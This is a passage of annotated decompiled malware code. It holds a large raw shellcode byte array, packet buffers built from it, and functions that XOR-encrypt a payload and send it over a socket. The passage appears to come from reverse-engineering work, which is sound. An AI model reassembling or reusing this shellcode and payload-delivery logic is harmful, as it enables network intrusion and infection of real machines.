  v1[823] = 117;
  v1[824] = 13;
  v1[825] = 59;
  v1[826] = 70;
  v1[827] = 4;
  v1[828] = 117;
  v1[829] = 8;
  v1[830] = -119;
  v1[831] = 117;
  v1[832] = 60;
  v1[833] = 49;
  v1[834] = -64;
  v1[835] = 64;
  v1[836] = -21;
  v1[837] = 2;
  v1[838] = 49;
  v1[839] = -64;
  v1[840] = 94;
  v1[841] = 90;
  v1[842] = 95;
  v1[843] = -61;
  v1[844] = 49;
  v1[845] = -64;
  v1[846] = 57;
  v1[847] = -63;
  v1[848] = 125;
  v1[849] = 1;
  v1[850] = 64;
  v1[851] = -61;
  v1[852] = 82;
  v1[853] = 81;
  v1[854] = 49;
  v1[855] = -46;
  v1[856] = 102;
  v1[857] = -117;
  v1[858] = 81;
  v1[859] = 2;
  v1[860] = 1;
  v1[861] = -54;
  v1[862] = 59;
  v1[863] = 17;
  v1[864] = 116;
  v1[865] = 5;
  v1[866] = -125;
  v1[867] = -63;
  v1[868] = 4;
  v1[869] = -21;
  v1[870] = -9;
  v1[871] = 90;
  v1[872] = -115;
  v1[873] = 65;
  v1[874] = 28;
  v1[875] = -125;
  v1[876] = -64;
  v1[877] = 7;
  v1[878] = 36;
  v1[879] = -8;
  v1[880] = -119;
  v1[881] = 69;
  v1[882] = 68;
  v1[883] = -117;
  v1[884] = 65;
  v1[885] = -8;
  v1[886] = -119;
  v1[887] = 69;
  v1[888] = 56;
  v1[889] = -119;
  v1[890] = -47;
  v1[891] = 90;
  v1[892] = -61;
  v1[893] = 83;
  v1[894] = 85;
  v1[895] = 87;
  v1[896] = 86;
  v1[897] = 65;
  v1[898] = 84;
  v1[899] = 65;
  v1[900] = 85;
  v1[901] = 65;
  v1[902] = 86;
  v1[903] = 65;
  v1[904] = 87;
  v1[905] = 72;
  v1[906] = -119;
  v1[907] = -27;
  v1[908] = 72;
  v1[909] = -127;
  v1[910] = -20;
  v1[911] = 0x80;
  v1[912] = 0;
  v1[913] = 0;
  v1[914] = 0;
  v1[915] = 102;
  v1[916] = -125;
  v1[917] = -28;
  v1[918] = -16;
  v1[919] = -24;
  v1[920] = -125;
  v1[921] = 3;
  v1[922] = 0;
  v1[923] = 0;
  v1[924] = 72;
  v1[925] = -119;
  v1[926] = 69;
  v1[927] = -8;
  v1[928] = 72;
  v1[929] = -119;
  v1[930] = -61;
  v1[931] = -71;
  v1[932] = 46;
  v1[933] = 91;
  v1[934] = 81;
  v1[935] = -46;
  v1[936] = -24;
  v1[937] = -18;
  v1[938] = 1;
  v1[939] = 0;
  v1[940] = 0;
  v1[941] = 72;
  v1[942] = -123;
  v1[943] = -64;
  v1[944] = 15;
  v1[945] = -124;
  v1[946] = -43;
  v1[947] = 1;
  v1[948] = 0;
  v1[949] = 0;
  v1[950] = 72;
  v1[951] = -119;
  v1[952] = -58;
  v1[953] = -71;
  v1[954] = -108;
  v1[955] = 1;
  v1[956] = 105;
  v1[957] = -29;
  v1[958] = -24;
  v1[959] = -40;
  v1[960] = 1;
  v1[961] = 0;
  v1[962] = 0;
  v1[963] = 72;
  v1[964] = -123;
  v1[965] = -64;
  v1[966] = 15;
  v1[967] = -124;
  v1[968] = -65;
  v1[969] = 1;
  v1[970] = 0;
  v1[971] = 0;
  v1[972] = 72;
  v1[973] = -119;
  v1[974] = 69;
  v1[975] = -16;
  v1[976] = 72;
  v1[977] = -119;
  v1[978] = -57;
  v1[979] = -71;
  v1[980] = -123;
  v1[981] = 84;
  v1[982] = -125;
  v1[983] = -16;
  v1[984] = -24;
  v1[985] = -66;
  v1[986] = 1;
  v1[987] = 0;
  v1[988] = 0;
  v1[989] = 72;
  v1[990] = -123;
  v1[991] = -64;
  v1[992] = 15;
  v1[993] = -124;
  v1[994] = -91;
  v1[995] = 1;
  v1[996] = 0;
  v1[997] = 0;
  v1[998] = 72;
  v1[999] = -119;
  v1[1000] = 69;
  v1[1001] = -24;
  v1[1002] = 76;
  v1[1003] = -115;
  v1[1004] = 77;
  v1[1005] = -48;
  v1[1006] = 77;
  v1[1007] = 49;
  v1[1008] = -64;
  v1[1009] = 76;
  v1[1010] = -119;
  v1[1011] = -63;
  v1[1012] = 68;
  v1[1013] = -119;
  v1[1014] = 69;
  v1[1015] = -48;
  v1[1016] = 76;
  v1[1017] = -119;
  v1[1018] = -62;
  v1[1019] = -79;
  v1[1020] = 11;
  v1[1021] = -1;
  v1[1022] = -42;
  v1[1023] = 68;
  v1[1024] = -117;
  v1[1025] = 69;
  v1[1026] = -48;
  v1[1027] = 69;
  v1[1028] = -123;
  v1[1029] = -64;
  v1[1030] = 15;
  v1[1031] = -124;
  v1[1032] = 127;
  v1[1033] = 1;
  v1[1034] = 0;
  v1[1035] = 0;
  v1[1036] = -117;
  v1[1037] = 85;
  v1[1038] = -48;
  v1[1039] = 72;
  v1[1040] = 49;
  v1[1041] = -55;
  v1[1042] = -1;
  v1[1043] = -41;
  v1[1044] = 72;
  v1[1045] = -123;
  v1[1046] = -64;
  v1[1047] = 15;
  v1[1048] = -124;
  v1[1049] = 110;
  v1[1050] = 1;
  v1[1051] = 0;
  v1[1052] = 0;
  v1[1053] = 72;
  v1[1054] = -119;
  v1[1055] = -61;
  v1[1056] = 72;
  v1[1057] = 49;
  v1[1058] = -55;
  v1[1059] = 73;
  v1[1060] = -119;
  v1[1061] = -55;
  v1[1062] = 68;
  v1[1063] = -117;
  v1[1064] = 69;
  v1[1065] = -48;
  v1[1066] = 72;
  v1[1067] = -119;
  v1[1068] = -62;
  v1[1069] = -79;
  v1[1070] = 11;
  v1[1071] = -1;
  v1[1072] = -42;
  v1[1073] = 72;
  v1[1074] = -123;
  v1[1075] = -64;
  v1[1076] = 15;
  v1[1077] = -123;
  v1[1078] = 81;
  v1[1079] = 1;
  v1[1080] = 0;
  v1[1081] = 0;
  v1[1082] = 72;
  v1[1083] = -119;
  v1[1084] = -40;
  v1[1085] = 72;
  v1[1086] = 45;
  v1[1087] = -8;
  v1[1088] = 0;
  v1[1089] = 0;
  v1[1090] = 0;
  v1[1091] = 72;
  v1[1092] = 5;
  v1[1093] = 40;
  v1[1094] = 1;
  v1[1095] = 0;
  v1[1096] = 0;
  v1[1097] = -117;
  v1[1098] = 85;
  v1[1099] = -48;
  v1[1100] = -127;
  v1[1101] = -22;
  v1[1102] = 40;
  v1[1103] = 1;
  v1[1104] = 0;
  v1[1105] = 0;
  v1[1106] = 15;
  v1[1107] = -116;
  v1[1108] = 51;
  v1[1109] = 1;
  v1[1110] = 0;
  v1[1111] = 0;
  v1[1112] = -119;
  v1[1113] = 85;
  v1[1114] = -48;
  v1[1115] = 80;
  v1[1116] = -24;
  v1[1117] = 63;
  v1[1118] = 2;
  v1[1119] = 0;
  v1[1120] = 0;
  v1[1121] = 72;
  v1[1122] = -119;
  v1[1123] = -62;
  v1[1124] = 88;
  v1[1125] = -71;
  v1[1126] = -6;
  v1[1127] = 60;
  v1[1128] = -83;
  v1[1129] = -62;
  v1[1130] = 72;
  v1[1131] = 57;
  v1[1132] = -54;
  v1[1133] = 116;
  v1[1134] = 10;
  v1[1135] = -71;
  v1[1136] = 26;
  v1[1137] = -67;
  v1[1138] = 75;
  v1[1139] = 43;
  v1[1140] = 72;
  v1[1141] = 57;
  v1[1142] = -54;
  v1[1143] = 117;
  v1[1144] = -54;
  v1[1145] = 72;
  v1[1146] = -117;
  v1[1147] = 112;
  v1[1148] = -24;
  v1[1149] = 72;
  v1[1150] = -119;
  v1[1151] = -39;
  v1[1152] = -1;
  v1[1153] = 85;
  v1[1154] = -24;
  v1[1155] = 72;
  v1[1156] = -119;
  v1[1157] = -16;
  v1[1158] = 72;
  v1[1159] = 49;
  v1[1160] = -46;
  v1[1161] = 72;
  v1[1162] = -119;
  v1[1163] = -61;
  v1[1164] = -117;
  v1[1165] = 80;
  v1[1166] = 60;
  v1[1167] = 72;
  v1[1168] = 1;
  v1[1169] = -48;
  v1[1170] = 72;
  v1[1171] = -119;
  v1[1172] = -58;
  v1[1173] = 72;
  v1[1174] = 49;
  v1[1175] = -55;
  v1[1176] = 72;
  v1[1177] = -119;
  v1[1178] = -54;
  v1[1179] = 102;
  v1[1180] = -117;
  v1[1181] = 72;
  v1[1182] = 6;
  v1[1183] = 102;
  v1[1184] = -117;
  v1[1185] = 80;
  v1[1186] = 20;
  v1[1187] = 72;
  v1[1188] = 1;
  v1[1189] = -42;
  v1[1190] = 72;
  v1[1191] = -125;
  v1[1192] = -58;
  v1[1193] = 24;
  v1[1194] = 72;
  v1[1195] = -65;
  strcpy(&v1[1196], ".data");
  v1[1202] = 0;
  v1[1203] = 0;
  v1[1204] = 72;
  v1[1205] = -125;
  v1[1206] = -7;
  v1[1207] = 0;
  v1[1208] = 15;
  v1[1209] = -124;
  v1[1210] = -51;
  v1[1211] = 0;
  v1[1212] = 0;
  v1[1213] = 0;
  v1[1214] = 72;
  v1[1215] = -117;
  v1[1216] = 6;
  v1[1217] = 72;
  v1[1218] = 57;
  v1[1219] = -8;
  v1[1220] = 116;
  v1[1221] = 9;
  v1[1222] = 72;
  v1[1223] = -125;
  v1[1224] = -58;
  v1[1225] = 40;
  v1[1226] = 72;
  v1[1227] = -1;
  v1[1228] = -55;
  v1[1229] = -21;
  v1[1230] = -27;
  v1[1231] = -117;
  v1[1232] = 70;
  v1[1233] = 12;
  v1[1234] = -117;
  v1[1235] = 78;
  v1[1236] = 8;
  v1[1237] = 72;
  v1[1238] = 1;
  v1[1239] = -58;
  v1[1240] = 72;
  v1[1241] = -69;
  v1[1242] = -2;
  v1[1243] = -2;
  v1[1244] = -2;
  v1[1245] = -2;
  v1[1246] = -2;
  v1[1247] = -2;
  v1[1248] = -2;
  v1[1249] = -2;
  v1[1250] = 72;
  v1[1251] = -125;
  v1[1252] = -23;
  v1[1253] = 8;
  v1[1254] = 72;
  v1[1255] = -125;
  v1[1256] = -7;
  v1[1257] = 0;
  v1[1258] = 15;
  v1[1259] = -116;
  v1[1260] = -101;
  v1[1261] = 0;
  v1[1262] = 0;
  v1[1263] = 0;
  v1[1264] = 72;
  v1[1265] = -117;
  v1[1266] = 62;
  v1[1267] = 72;
  v1[1268] = 57;
  v1[1269] = -33;
  v1[1270] = 117;
  v1[1271] = 12;
  v1[1272] = 76;
  v1[1273] = -117;
  v1[1274] = -122;
  v1[1275] = -104;
  v1[1276] = 0;
  v1[1277] = 0;
  v1[1278] = 0;
  v1[1279] = 77;
  v1[1280] = -123;
  v1[1281] = -64;
  v1[1282] = 116;
  v1[1283] = 6;
  v1[1284] = 72;
  v1[1285] = -125;
  v1[1286] = -58;
  v1[1287] = 8;
  v1[1288] = -21;
  v1[1289] = -40;
  v1[1290] = 72;
  v1[1291] = -125;
  v1[1292] = -58;
  v1[1293] = 8;
  v1[1294] = 72;
  v1[1295] = -119;
  v1[1296] = 117;
  v1[1297] = -32;
  v1[1298] = 72;
  v1[1299] = 49;
  v1[1300] = -55;
  v1[1301] = -70;
  v1[1302] = -16;
  v1[1303] = 15;
  v1[1304] = 0;
  v1[1305] = 0;
  v1[1306] = -1;
  v1[1307] = 85;
  v1[1308] = -16;
  v1[1309] = 72;
  v1[1310] = -123;
  v1[1311] = -64;
  v1[1312] = 116;
  v1[1313] = 105;
  v1[1314] = 73;
  v1[1315] = -119;
  v1[1316] = -63;
  v1[1317] = 72;
  v1[1318] = 49;
  v1[1319] = -64;
  v1[1320] = -71;
  v1[1321] = 0;
  v1[1322] = 4;
  v1[1323] = 0;
  v1[1324] = 0;
  v1[1325] = 76;
  v1[1326] = -119;
  v1[1327] = -49;
  v1[1328] = -13;
  v1[1329] = -85;
  v1[1330] = 76;
  v1[1331] = -119;
  v1[1332] = -49;
  v1[1333] = 72;
  v1[1334] = -125;
  v1[1335] = -57;
  v1[1336] = 96;
  v1[1337] = 72;
  v1[1338] = -115;
  v1[1339] = 53;
  v1[1340] = -111;
  v1[1341] = 2;
  v1[1342] = 0;
  v1[1343] = 0;
  v1[1344] = 72;
  v1[1345] = 49;
  v1[1346] = -55;
  v1[1347] = 102;
  v1[1348] = -71;
  v1[1349] = 54;
  v1[1350] = 2;
  v1[1351] = -13;
  v1[1352] = -92;
  v1[1353] = 77;
  v1[1354] = -119;
  v1[1355] = 9;
  v1[1356] = 72;
  v1[1357] = -117;
  v1[1358] = 93;
  v1[1359] = -8;
  v1[1360] = 73;
  v1[1361] = -119;
  v1[1362] = 89;
  v1[1363] = 8;
  v1[1364] = 72;
  v1[1365] = 49;
  v1[1372] = -119;
  v1[1383] = -119;
  v1[1394] = -119;
  v1[1401] = -119;
  v1[1417] = -119;
  v1[1367] = 72;
  v1[1375] = 72;
  v1[1378] = 72;
  v1[1386] = 72;
  v1[1389] = 72;
  v1[1397] = 72;
  v1[1404] = 72;
  v1[1408] = 72;
  v1[1419] = 72;
  v1[1366] = -33;
  v1[1368] = -117;
  v1[1369] = 93;
  v1[1370] = -16;
  v1[1371] = 73;
  v1[1373] = 89;
  v1[1374] = 16;
  v1[1376] = 49;
  v1[1377] = -33;
  v1[1379] = -117;
  v1[1380] = 93;
  v1[1381] = -24;
  v1[1382] = 73;
  v1[1384] = 89;
  v1[1385] = 24;
  v1[1387] = 49;
  v1[1388] = -33;
  v1[1390] = -117;
  v1[1391] = 93;
  v1[1392] = -32;
  v1[1393] = 73;
  v1[1395] = 89;
  v1[1396] = 32;
  v1[1398] = 49;
  v1[1399] = -33;
  v1[1400] = 65;
  v1[1402] = 121;
  v1[1403] = 68;
  v1[1405] = -117;
  v1[1406] = 69;
  v1[1407] = -32;
  v1[1409] = -125;
  v1[1410] = -64;
  v1[1411] = 112;
  v1[1412] = 73;
  v1[1413] = -125;
  v1[1414] = -63;
  v1[1415] = 96;
  v1[1416] = 76;
  v1[1418] = 8;
  dword_559670 = 1420;
  qmemcpy(&unk_559674, v1, 0x58Cu);
  dword_55BD88 = -536870912;
  dword_55BD8C = 1060278489;
  word_55BD90 = 0;
  dword_55BD94 = 9;
  dword_55BD98 = 1460;
  qmemcpy(&unk_55BD9C, &unk_42BC40, 0x5B4u);
  dword_55E4B0 = -1207959552;
  dword_55E4B4 = 1060996161;
  word_55E4B8 = 0;
  dword_55E4BC = 9;
  dword_55E4C0 = 1460;
  qmemcpy(&unk_55E4C4, nullsub_3, 0x5B4u);
  dword_560BD8 = -889192448;
  dword_560BDC = 1064307734;
  word_560BE0 = 0;
  dword_560BE4 = 10;
  dword_560BE8 = 1460;
  qmemcpy(&unk_560BEC, &unk_42BC40, 0x5B4u);
  dword_563300 = -1879048192;
  dword_563304 = 1059161735;
  word_563308 = 0;
  dword_56330C = 10;
  dword_563310 = 1460;
  qmemcpy(&unk_563314, nullsub_3, 0x5B4u);
  dword_565A28 = 1342177280;
  dword_565A2C = 1060973819;
  word_565A30 = 0;
  dword_565A34 = 11;
  dword_565A38 = 1500;
  qmemcpy(&unk_565A3C, &unk_42C7A8, 0x5DCu);
  dword_568150 = 0x20000000;
  dword_568154 = 1058646225;
  word_568158 = 0;
  dword_56815C = 11;
  dword_568160 = 1420;
  qmemcpy(&unk_568164, v1, 0x58Cu);
  dword_56A878 = 0x10000000;
  dword_56A87C = 1058432267;
  word_56A880 = 0;
  dword_56A884 = 12;
  dword_56A888 = 1460;
  qmemcpy(&unk_56A88C, &unk_42BC40, 0x5B4u);
  dword_56CFA0 = 0x4000000;
  dword_56CFA4 = 1060763615;
  word_56CFA8 = 0;
  dword_56CFAC = 12;
  dword_56CFB0 = 1460;
  qmemcpy(&unk_56CFB4, nullsub_3, 0x5B4u);
  dword_56F6C8 = -1879048192;
  dword_56F6CC = 1058630694;
  word_56F6D0 = 0;
  dword_56F6D4 = 13;
  dword_56F6D8 = 1460;
  qmemcpy(&unk_56F6DC, &unk_42BC40, 0x5B4u);
  dword_571DF0 = 788529152;
  dword_571DF4 = 1062282355;
  word_571DF8 = 0;
  dword_571DFC = 13;
  dword_571E00 = 1460;
  qmemcpy(&unk_571E04, nullsub_3, 0x5B4u);
  dword_574518 = -1048576000;
  dword_57451C = 1064208061;
  word_574520 = 0;
  dword_574524 = 14;
  dword_574528 = 1460;
  qmemcpy(&unk_57452C, &unk_42BC40, 0x5B4u);
  dword_576C40 = -2013265920;
  dword_576C44 = 1059173529;
  word_576C48 = 0;
  dword_576C4C = 14;
  dword_576C50 = 1460;
  qmemcpy(&unk_576C54, nullsub_3, 0x5B4u);
  dword_579368 = 0x10000000;
  dword_57936C = 1060819471;
  word_579370 = 0;
  dword_579374 = 15;
  dword_579378 = 1460;
  qmemcpy(&unk_57937C, &unk_42BC40, 0x5B4u);
  dword_57BA90 = 1744830464;
  dword_57BA94 = 1060802381;
  word_57BA98 = 0;
  dword_57BA9C = 15;
  dword_57BAA0 = 1460;
  qmemcpy(&unk_57BAA4, nullsub_3, 0x5B4u);
  dword_57E1B8 = 0x20000000;
  dword_57E1BC = 1058306390;
  word_57E1C0 = 0;
  dword_57E1C4 = 17;
  dword_57E1C8 = 1500;
  qmemcpy(&unk_57E1CC, &unk_42C7A8, 0x5DCu);
  dword_5808E0 = -536870912;
  dword_5808E4 = 1057872028;
  word_5808E8 = 0;
  dword_5808EC = 17;
  dword_5808F0 = 1420;
  qmemcpy(&unk_5808F4, v1, 0x58Cu);
  dword_583008 = -402653184;
  dword_58300C = 1061449289;
  word_583010 = 0;
  dword_583014 = 18;
  dword_583018 = 1500;
  qmemcpy(&unk_58301C, &unk_42C7A8, 0x5DCu);
  dword_585730 = -268435456;
  dword_585734 = 1058197675;
  word_585738 = 0;
  dword_58573C = 18;
  dword_585740 = 1420;
  qmemcpy(&unk_585744, v1, 0x58Cu);
  dword_587E58 = 805306368;
  dword_587E5C = 1059996342;
  word_587E60 = 0;
  dword_587E64 = 19;
  dword_587E68 = 1500;
  qmemcpy(&unk_587E6C, &unk_42C7A8, 0x5DCu);
  dword_58A580 = -201326592;
  dword_58A584 = 1060325871;
  word_58A588 = 0;
  dword_58A58C = 19;
  dword_58A590 = 1420;
  qmemcpy(&unk_58A594, v1, 0x58Cu);
  dword_58CCA8 = -738197504;
  dword_58CCAC = 1060733223;
  word_58CCB0 = 0;
  dword_58CCB4 = 20;
  dword_58CCB8 = 1460;
  qmemcpy(&unk_58CCBC, &unk_42BC40, 0x5B4u);
  dword_58F3D0 = -1476395008;
  dword_58F3D4 = 1062195688;
  word_58F3D8 = 0;
  dword_58F3DC = 20;
  dword_58F3E0 = 1460;
  qmemcpy(&unk_58F3E4, nullsub_3, 0x5B4u);
  dword_591AF8 = 1342177280;
  dword_591AFC = 1058441269;
  word_591B00 = 0;
  dword_591B04 = 21;
  dword_591B08 = 1460;
  qmemcpy(&unk_591B0C, &unk_42BC40, 0x5B4u);
  dword_594220 = -1275068416;
  dword_594224 = 1060664800;
  word_594228 = 0;
  dword_59422C = 21;
  dword_594230 = 1460;
  qmemcpy(&unk_594234, nullsub_3, 0x5B4u);
  dword_596948 = 2080374784;
  dword_59694C = 1060197744;
  word_596950 = 0;
  dword_596954 = 3;
  dword_596958 = 1152;
  qmemcpy(&unk_59695C, &unk_42DE28, 0x480u);
  dword_599070 = -234881024;
  dword_599074 = 1061454677;
  word_599078 = 0;
  dword_59907C = 4;
  dword_599080 = 1152;
  qmemcpy(&unk_599084, &unk_42DE28, 0x480u);
  dword_59B798 = 1879048192;
  dword_59B79C = 1058321508;
  word_59B7A0 = 0;
  dword_59B7A4 = 5;
  dword_59B7A8 = 1152;
  qmemcpy(&unk_59B7AC, &unk_42DE28, 0x480u);
  dword_59DEC0 = 763363328;
  dword_59DEC4 = 1064182994;
  word_59DEC8 = 0;
  dword_59DECC = 6;
  dword_59DED0 = 1152;
  qmemcpy(&unk_59DED4, &unk_42DE28, 0x480u);
  dword_5A05E8 = -1677721600;
  dword_5A05EC = 1060781722;
  word_5A05F0 = 0;
  dword_5A05F4 = 7;
  dword_5A05F8 = 1152;
  qmemcpy(&unk_5A05FC, &unk_42DE28, 0x480u);
  dword_5A2D10 = -100663296;
  dword_5A2D14 = 1061448329;
  word_5A2D18 = 0;
  dword_5A2D1C = 8;
  dword_5A2D20 = 1152;
  qmemcpy(&unk_5A2D24, &unk_42DE28, 0x480u);
  dword_5A5438 = -1275068416;
  dword_5A543C = 1060716782;
  word_5A5440 = 0;
  dword_5A5444 = 9;
  dword_5A5448 = 1152;
  qmemcpy(&unk_5A544C, &unk_42DE28, 0x480u);
  dword_5A7B60 = -805306368;
  dword_5A7B64 = 1058450580;
  word_5A7B68 = 0;
  dword_5A7B6C = 10;
  dword_5A7B70 = 1152;
  qmemcpy(&unk_5A7B74, &unk_42DE28, 0x480u);
  dword_5AA288 = -738197504;
  dword_5AA28C = 1060715124;
  word_5AA290 = 0;
  dword_5AA294 = 11;
  dword_5AA298 = 1152;
  qmemcpy(&unk_5AA29C, &unk_42DE28, 0x480u);
  dword_5AC9B0 = -1610612736;
  dword_5AC9B4 = 1057756339;
  word_5AC9B8 = 0;
  dword_5AC9BC = 12;
  dword_5AC9C0 = 1152;
  qmemcpy(&unk_5AC9C4, &unk_42DE28, 0x480u);
  dword_5AF0D8 = 0x10000000;
  dword_5AF0DC = 1059070519;
  word_5AF0E0 = 0;
  dword_5AF0E4 = 13;
  dword_5AF0E8 = 1152;
  qmemcpy(&unk_5AF0EC, &unk_42DE28, 0x480u);
  dword_5B1800 = -511705088;
  dword_5B1804 = 1063730191;
  word_5B1808 = 0;
  dword_5B180C = 14;
  dword_5B1810 = 1152;
  qmemcpy(&unk_5B1814, &unk_42DE28, 0x480u);
  dword_5B3F28 = 771751936;
  dword_5B3F2C = 1061217529;
  word_5B3F30 = 0;
  dword_5B3F34 = 15;
  dword_5B3F38 = 1152;
  qmemcpy(&unk_5B3F3C, &unk_42DE28, 0x480u);
  dword_5B6650 = 0;
  dword_5B6654 = 1058488995;
  word_5B6658 = 0;
  dword_5B665C = 17;
  dword_5B6660 = 1152;
  qmemcpy(&unk_5B6664, &unk_42DE28, 0x480u);
  dword_5B8D78 = 0;
  dword_5B8D7C = 1057480259;
  word_5B8D80 = 0;
  dword_5B8D84 = 18;
  dword_5B8D88 = 1152;
  qmemcpy(&unk_5B8D8C, &unk_42DE28, 0x480u);
  dword_5BB4A0 = 671088640;
  dword_5BB4A4 = 1060045193;
  word_5BB4A8 = 0;
  dword_5BB4AC = 19;
  dword_5BB4B0 = 1152;
  qmemcpy(&unk_5BB4B4, &unk_42DE28, 0x480u);
  dword_5BDBC8 = 1879048192;
  dword_5BDBCC = 1060417801;
  word_5BDBD0 = 0;
  dword_5BDBD4 = 20;
  dword_5BDBD8 = 1152;
  qmemcpy(&unk_5BDBDC, &unk_42DE28, 0x480u);
  dword_5C02F0 = 1946157056;
  dword_5C02F4 = 1061859869;
  word_5C02F8 = 0;
  dword_5C02FC = 21;
  dword_5C0300 = 1152;
  qmemcpy(&unk_5C0304, &unk_42DE28, 0x480u);
  dword_5C2A18 = -1543503872;
  dword_5C2A1C = 1061222253;
  word_5C2A20 = 3;
  dword_5C2A24 = 3;
  dword_5C5140 = 245458944;
  dword_5C5144 = 1076096882;
  word_5C5148 = 3;
  dword_5C514C = 4;
  dword_5C7868 = 0x8000000;
  dword_5C786C = 1059111347;
  word_5C7870 = 3;
  dword_5C7874 = 5;
  dword_5C9F90 = 486539264;
  dword_5C9F94 = 1062625145;
  word_5C9F98 = 3;
  dword_5C9F9C = 6;
  dword_5CC6B8 = 0;
  dword_5CC6BC = 1058122033;
  word_5CC6C0 = 3;
  dword_5CC6C4 = 7;
  dword_5CEDE0 = 0;
  dword_5CEDE4 = 1058150122;
  word_5CEDE8 = 3;
  dword_5CEDEC = 8;
  dword_5D1508 = 1241513984;
  dword_5D150C = 1064490997;
  word_5D1510 = 3;
  dword_5D1514 = 9;
  dword_5D3C30 = -536870912;
  dword_5D3C34 = 1057708991;
  word_5D3C38 = 3;
  dword_5D3C3C = 10;
  dword_5D6358 = 0x20000000;
  dword_5D635C = 1057838631;
  word_5D6360 = 3;
  dword_5D6364 = 11;
  dword_5D8A80 = 0;
  dword_5D8A84 = 1057986756;
  word_5D8A88 = 3;
  dword_5D8A8C = 12;
  dword_5DB1A8 = -1073741824;
  dword_5DB1AC = 1056997401;
  word_5DB1B0 = 3;
  dword_5DB1B4 = 13;
  dword_5DD8D0 = 0x80000000;
  dword_5DD8D4 = 1057148206;
  word_5DD8D8 = 3;
  dword_5DD8DC = 14;
  dword_5DFFF8 = 0x80000000;
  dword_5DFFFC = 1056837162;
  word_5E0000 = 3;
  dword_5E0004 = 15;
  dword_5E2720 = 0x80000000;
  dword_5E2724 = 1056934881;
  word_5E2728 = 3;
  dword_5E272C = 17;
  dword_5E4E48 = -1950351360;
  dword_5E4E4C = 1064699719;
  word_5E4E50 = 0;
  dword_5E4E54 = 1;
  dword_5E4E58 = 124;
  qmemcpy(&unk_5E4E5C, &unk_42E2A8, 0x51u);
  dword_5E7570 = 2120744960;
  dword_5E7574 = 1069487193;
  word_5E7578 = 1;
  dword_5E757C = 1;
  dword_5E9C98 = 1696595968;
  dword_5E9C9C = 1065934100;
  word_5E9CA0 = 0;
  dword_5E9CA4 = 1;
  dword_5E9CA8 = 81;
  qmemcpy(&unk_5E9CAC, &unk_42E324, 0x51u);
  dword_5EC3C0 = 0x20000000;
  dword_5EC3C4 = 1058192539;
  word_5EC3C8 = 3;
  dword_5EC3CC = 18;
  dword_5EEAE8 = -1073741824;
  dword_5EEAEC = 1057757885;
  word_5EEAF0 = 3;
  dword_5EEAF4 = 19;
  dword_5F1210 = -1073741824;
  dword_5F1214 = 1056403267;
  word_5F1218 = 3;
  dword_5F121C = 20;
  dword_5F3938 = 0x80000000;
  dword_5F393C = 1057250873;
  word_5F3940 = 3;
  dword_5F3944 = 21;
  dword_5F6060 = 0x40000000;
  dword_5F6064 = 1056353583;
  word_5F6068 = 1;
  dword_5F606C = 1;
  dword_5F8788 = 1696595968;
  dword_5F878C = 1065934100;
  word_5F8790 = 0;
  dword_5F8794 = 1;
  dword_5F8798 = 85;
  qmemcpy(&unk_5F879C, &unk_42E378, 0x55u);
  dword_5FAEB0 = 180355072;
  dword_5FAEB4 = 1065580886;
  word_5FAEB8 = 1;
  dword_5FAEBC = 1;
  dword_5FD5D8 = 1015021568;
  dword_5FD5DC = 1065632221;
  word_5FD5E0 = 3;
  dword_5FD5E4 = 1;
  dword_5FFD00 = -1491075072;
  dword_5FFD04 = 1065705160;
  return result;
}


// --- Metadata ---
// Function Name: isSecondParamZero_406EB0
// Address: 0x406EB0
// Signature: unknown_signature
// ---------------
BOOL __cdecl isSecondParamZero_406EB0(int a1, int a2)
{
  return a2 == 0;
}


// --- Metadata ---
// Function Name: obfuscateSessionId_406ED0
// Address: 0x406ED0
// Signature: unknown_signature
// ---------------
unsigned int __cdecl obfuscateSessionId_406ED0(unsigned int a1)
{
  return (2 * a1) ^ (((HIWORD(a1) | a1 & 0xFF0000) >> 8) | (((a1 << 16) | a1 & 0xFF00) << 8));// 세션 아이디 난독화 
}


// --- Metadata ---
// Function Name: xorEncryptBuffer_406F00
// Address: 0x406F00
// Signature: unknown_signature
// ---------------
int __cdecl xorEncryptBuffer_406F00(int a1, int a2, int a3)
{
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  char v6; // [esp+8h] [ebp-4h]

  v3 = 0;
  v6 = 0;
  v5 = a1;
  if ( a3 <= 0 )                                // 4바이트 키 (int key)를 이용한 XOR 스트림 암호화 
    return 0;
  do
  {
    *(v3 + a2) ^= *(&v5 + v3 % 4);
    ++v3;
  }
  while ( v3 < a3 );
  return 0;
}


// --- Metadata ---
// Function Name: sendEncryptedPayload_406F50
// Address: 0x406F50
// Signature: unknown_signature
// ---------------
int __cdecl sendEncryptedPayload_406F50(SOCKET s, int a2, int a3)
{
  const void *v3; // esi
  unsigned int v4; // ebx
  void *v5; // ebp
  char *v6; // eax
  const void *v7; // esi
  int v8; // ebx
  int v9; // ebp
  int v10; // esi
  bool v11; // cc
  int v12; // ebx
  _DWORD v14[3]; // [esp+10h] [ebp-20E4h] BYREF
  int v15; // [esp+1Ch] [ebp-20D8h]
  HGLOBAL hMem; // [esp+20h] [ebp-20D4h]
  int i; // [esp+24h] [ebp-20D0h]
  int v18; // [esp+28h] [ebp-20CCh]
  char buf[70]; // [esp+2Ch] [ebp-20C8h] BYREF
  int v20; // [esp+72h] [ebp-2082h]
  int v21; // [esp+76h] [ebp-207Eh]
  int v22; // [esp+7Ah] [ebp-207Ah]
  char v23[4211]; // [esp+7Eh] [ebp-2076h] BYREF
  __int16 v24; // [esp+10F1h] [ebp-1003h]
  char v25; // [esp+10F3h] [ebp-1001h]
  char v26; // [esp+10F4h] [ebp-1000h] BYREF
  char v27[4092]; // [esp+10F5h] [ebp-FFFh] BYREF
  __int16 v28; // [esp+20F1h] [ebp-3h]
  char v29; // [esp+20F3h] [ebp-1h]

  buf[0] = 0;
  memset(&buf[1], 0, 0x10C4u);
  v24 = 0;
  v25 = 0;
  v26 = 0;
  memset(v27, 0, sizeof(v27));
  v28 = 0;
  v29 = 0;
  *(v14 + 1) = 0;
  LOBYTE(v14[0]) = 0;
  *(&v14[1] + 1) = 0;
  *(&v14[2] + 1) = 0;
  HIBYTE(v14[2]) = 0;
  if ( a2 )                                     // 메모리 할당 및 4kb 단위 메시지 전송 
  {
    v3 = *&FileName[260];
    v4 = 4869;
    v5 = &unk_506000;
  }
  else
  {
    v3 = *&FileName[264];
    v4 = 6144;
    v5 = &unk_50D800;
  }
  v6 = GlobalAlloc(0x40u, v5 + v4 + 12);
  hMem = v6;
  if ( v6 )
  {
    qmemcpy(&v6[v4], v3, v5);
    if ( (v5 + v4) % 4 )
    {
      v15 = 4 * ((v5 + v4) / 4) + 4;
      v6 = hMem;
    }
    else
    {
